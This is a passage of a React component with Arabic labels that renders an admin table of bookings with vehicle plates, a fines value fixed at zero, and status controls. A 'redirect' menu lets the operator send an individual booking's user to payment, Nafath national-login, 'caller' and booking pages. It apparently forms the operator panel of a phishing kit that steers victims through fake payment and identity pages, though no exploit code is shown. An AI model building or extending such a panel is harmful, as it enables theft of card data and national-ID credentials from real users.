            <h2 style={{ margin: 0, fontSize: 17, fontWeight: 700, color: "#1e293b" }}>قائمة الحجوزات</h2>
            <div style={{ position: "relative" }}>
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", pointerEvents: "none" }}>
                <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
              </svg>
              <input
                type="text"
                placeholder="بحث..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                style={{
                  paddingRight: 34,
                  paddingLeft: 12,
                  height: 38,
                  border: "1px solid #e5e7eb",
                  borderRadius: 8,
                  fontSize: 13,
                  outline: "none",
                  width: 200,
                  fontFamily: "'Cairo', sans-serif",
                  color: "#374151",
                  background: "#f9fafb"
                }}
              />
            </div>
          </div>

          {/* Table */}
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
              <thead>
                <tr style={{ background: "#f8fafc", borderTop: "1px solid #e8ecf0", borderBottom: "1px solid #e8ecf0" }}>
                  {[
                    "قيمة المخالفات",
                    "جهة إصدار اللوحة",
                    "رقم اللوحة",
                    "رمز اللوحة",
                    "اللوحة",
                    "التاريخ",
                    "الحالة",
                    "الإجراءات"
                  ].map((h) => (
                    <th key={h} style={{ padding: "11px 14px", textAlign: "right", fontWeight: 600, color: "#64748b", fontSize: 12, whiteSpace: "nowrap" }}>
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {isLoading ? (
                  <tr>
                    <td colSpan={8} style={{ textAlign: "center", padding: "48px", color: "#94a3b8" }}>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
                        <div style={{ width: 20, height: 20, border: "3px solid #4361ee", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
                        جاري التحميل...
                      </div>
                    </td>
                  </tr>
                ) : filtered.length === 0 ? (
                  <tr>
                    <td colSpan={8} style={{ textAlign: "center", padding: "48px", color: "#94a3b8" }}>
                      لا توجد حجوزات
                    </td>
                  </tr>
                ) : (
                  filtered.map((booking) => {
                    const statusInfo = STATUS_LABELS[booking.status] || {
                      label: booking.status,
                      color: "#64748b",
                      bg: "#f1f5f9",
                      border: "#e2e8f0",
                    };

                    const plateParts = booking.vehiclePlate?.split("-") || [];
                    const plateNum = plateParts[0] || booking.vehiclePlate || "—";
                    const plateCode = plateParts[1] || "—";
                    const plateRegion = booking.serviceRegion?.split(" ")[0] || "—";
                    const isExpanded = expandedRow === booking.referenceId;

                    return (
                      <>
                        <tr
                          key={booking.id}
                          style={{
                            borderBottom: isExpanded ? "none" : "1px solid #f1f5f9",
                            transition: "background 0.1s",
                            background: isExpanded ? "#f0f4ff" : "white"
                          }}
                          onMouseEnter={(e) => { if (!isExpanded) e.currentTarget.style.background = "#f8fafc"; }}
                          onMouseLeave={(e) => { if (!isExpanded) e.currentTarget.style.background = "white"; }}
                        >
                          {/* قيمة المخالفات */}
                          <td style={{ padding: "12px 14px", color: "#1e293b", fontWeight: 600, whiteSpace: "nowrap" }}>
                            0.00 درهم
                          </td>

                          {/* جهة إصدار اللوحة */}
                          <td style={{ padding: "12px 14px", color: "#374151", fontWeight: 500, whiteSpace: "nowrap" }}>
                            {plateRegion}
                          </td>

                          {/* رقم اللوحة */}
                          <td style={{ padding: "12px 14px", color: "#374151", whiteSpace: "nowrap" }}>
                            {plateNum}
                          </td>

                          {/* رمز اللوحة */}
                          <td style={{ padding: "12px 14px", color: "#374151", whiteSpace: "nowrap" }}>
                            {plateCode !== "—" ? plateCode : (booking.clientId?.slice(-2) || "—")}
                          </td>

                          {/* اللوحة */}
                          <td style={{ padding: "12px 14px", whiteSpace: "nowrap" }}>
                            <span style={{ background: "#f1f5f9", border: "1px solid #e2e8f0", borderRadius: 6, padding: "3px 10px", fontSize: 12, fontFamily: "monospace", color: "#374151" }}>
                              {plateNum}
                            </span>
                          </td>

                          {/* التاريخ */}
                          <td style={{ padding: "12px 14px", color: "#64748b", fontSize: 12, whiteSpace: "nowrap" }}>
                            {new Date(booking.createdAt).toLocaleDateString("en-GB").replace(/\//g, "/")}
                          </td>

                          {/* الحالة */}
                          <td style={{ padding: "12px 14px" }}>
                            <span style={{
                              background: statusInfo.bg,
                              color: statusInfo.color,
                              border: `1px solid ${statusInfo.border}`,
                              borderRadius: 20,
                              padding: "3px 12px",
                              fontSize: 11,
                              fontWeight: 600,
                              whiteSpace: "nowrap"
                            }}>
                              {statusInfo.label}
                            </span>
                          </td>

                          {/* الإجراءات */}
                          <td style={{ padding: "12px 14px" }} onClick={(e) => e.stopPropagation()}>
                            <div style={{ display: "flex", gap: 6, alignItems: "center" }}>

                              {/* زر التفاصيل - أزرق - يفتح/يغلق القائمة المنسدلة */}
                              <button
                                onClick={() => {
                                  markReadMutation.mutate({ reference: booking.referenceId });
                                  toggleRow(booking.referenceId);
                                }}
                                style={{
                                  background: isExpanded ? "#3451d1" : "#4361ee",
                                  color: "white",
                                  border: "none",
                                  borderRadius: 7,
                                  padding: "6px 12px",
                                  fontSize: 12,
                                  fontWeight: 600,
                                  cursor: "pointer",
                                  display: "flex",
                                  alignItems: "center",
                                  gap: 5,
                                  fontFamily: "'Cairo', sans-serif",
                                  whiteSpace: "nowrap",
                                  boxShadow: isExpanded ? "0 0 0 2px #a5b4fc" : "none"
                                }}
                              >
                                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                  <circle cx="12" cy="12" r="3"/>
                                </svg>
                                تفاصيل
                                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" style={{ transform: isExpanded ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}>
                                  <polyline points="6 9 12 15 18 9"/>
                                </svg>
                              </button>

                              {/* زر التوجيه - بنفسجي */}
                              <DropdownMenu>
                                <DropdownMenuTrigger asChild>
                                  <button style={{
                                    background: "#7c3aed",
                                    color: "white",
                                    border: "none",
                                    borderRadius: 7,
                                    padding: "6px 12px",
                                    fontSize: 12,
                                    fontWeight: 600,
                                    cursor: "pointer",
                                    display: "flex",
                                    alignItems: "center",
                                    gap: 5,
                                    fontFamily: "'Cairo', sans-serif",
                                    whiteSpace: "nowrap"
                                  }}>
                                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                      <polygon points="3 11 22 2 13 21 11 13 3 11"/>
                                    </svg>
                                    توجيه
                                  </button>
                                </DropdownMenuTrigger>
                                <DropdownMenuContent align="end" className="w-48">
                                  <DropdownMenuItem onClick={() => handleNavigate(booking, "/payment")} className="text-sm gap-2">
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#1B8354" strokeWidth="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                                    صفحة الدفع
                                  </DropdownMenuItem>
                                  <DropdownMenuItem onClick={() => handleNavigate(booking, "/nafath")} className="text-sm gap-2">
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6f42c1" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                                    صفحة نفاذ
                                  </DropdownMenuItem>
                                  <DropdownMenuItem onClick={() => handleNavigate(booking, "/motasel")} className="text-sm gap-2">
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fd7e14" strokeWidth="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.41 2 2 0 0 1 3.6 1.21h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.91a16 16 0 0 0 6 6l.92-.92a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21.73 16.92z"/></svg>
                                    صفحة المتصل
                                  </DropdownMenuItem>
                                  <DropdownMenuItem onClick={() => handleNavigate(booking, "/booking")} className="text-sm gap-2">
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#0d6efd" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
                                    صفحة الحجز
                                  </DropdownMenuItem>
                                  <DropdownMenuItem onClick={() => handleNavigate(booking, "/")} className="text-sm gap-2">
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6c757d" strokeWidth="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
                                    الصفحة الرئيسية
                                  </DropdownMenuItem>
                                </DropdownMenuContent>
                              </DropdownMenu>

                              {/* زر تغيير الحالة - رمادي */}
                              <DropdownMenu>
                                <DropdownMenuTrigger asChild>
                                  <button
                                    title="تغيير الحالة"
                                    style={{
                                      background: "#f1f5f9",
                                      color: "#64748b",
                                      border: "1px solid #e2e8f0",
                                      borderRadius: 7,
                                      padding: "6px 8px",
                                      fontSize: 11,
                                      cursor: "pointer",
                                      display: "flex",
                                      alignItems: "center"
                                    }}
                                  >
                                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                      <polyline points="6 9 12 15 18 9"/>
                                    </svg>
                                  </button>
                                </DropdownMenuTrigger>
                                <DropdownMenuContent align="end" className="w-40">
                                  <DropdownMenuItem
                                    onClick={() => updateStatusMutation.mutate({ reference: booking.referenceId, status: "completed", statusRead: 1 })}
                                    className="text-sm text-green-600"
                                  >
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2" style={{ marginLeft: 6 }}><polyline points="20 6 9 17 4 12"/></svg>
                                    مكتمل
                                  </DropdownMenuItem>
                                  <DropdownMenuItem
                                    onClick={() => updateStatusMutation.mutate({ reference: booking.referenceId, status: "cancelled", statusRead: 1 })}
                                    className="text-sm text-red-600"
                                  >
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#dc2626" strokeWidth="2" style={{ marginLeft: 6 }}><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                                    إلغاء
                                  </DropdownMenuItem>
                                </DropdownMenuContent>
                              </DropdownMenu>

                            </div>
                          </td>
                        </tr>

                        {/* صف التفاصيل المنسدل */}
                        {isExpanded && (
                          <BookingDetailsRow
                            key={`details-${booking.referenceId}`}
                            booking={booking}
                            onClose={() => setExpandedRow(null)}
                            onPaymentAction={handlePaymentAction}
                            onNavigate={handleNavigate}
                          />
                        )}
                      </>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>

          {/* Footer */}
          {filtered.length > 0 && (
            <div style={{ padding: "12px 20px", borderTop: "1px solid #f1f5f9" }}>
              <span style={{ fontSize: 12, color: "#94a3b8" }}>
                إجمالي النتائج: <strong style={{ color: "#374151" }}>{filtered.length}</strong> حجز
              </span>
            </div>
          )}
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes slideDown {
          from { opacity: 0; transform: translateY(-8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        * { box-sizing: border-box; }
        body { font-family: 'Cairo', sans-serif !important; }
        @media (max-width: 900px) {
          .stats-grid { grid-template-columns: repeat(2, 1fr) !important; }
        }
        @media (max-width: 500px) {
          .stats-grid { grid-template-columns: 1fr !important; }
        }
      `}</style>
    </div>
  );
}
